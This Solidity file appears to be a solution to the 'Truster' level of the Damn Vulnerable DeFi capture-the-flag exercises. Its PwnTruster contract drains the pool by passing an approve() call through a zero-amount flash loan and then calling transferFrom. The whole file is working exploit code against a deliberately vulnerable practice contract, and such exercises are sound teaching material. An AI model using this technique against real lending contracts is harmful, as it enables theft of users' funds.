//SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract PwnTruster {

    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public recovery;
    constructor(address tokenAddress, address poolAddress, address recoveryAddress){
        token = DamnValuableToken(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
        recovery = recoveryAddress;
    }

    function pwn() external returns (bool) {
        uint256 amount = token.balanceOf(address(pool));
        require(
            pool.flashLoan(
                    0, 
                    address(this), 
                    address(token), 
                    abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
                )
            );
        require(token.transferFrom(address(pool), address(this), amount));
        require(token.transfer(recovery, amount));

        return true;
    }

}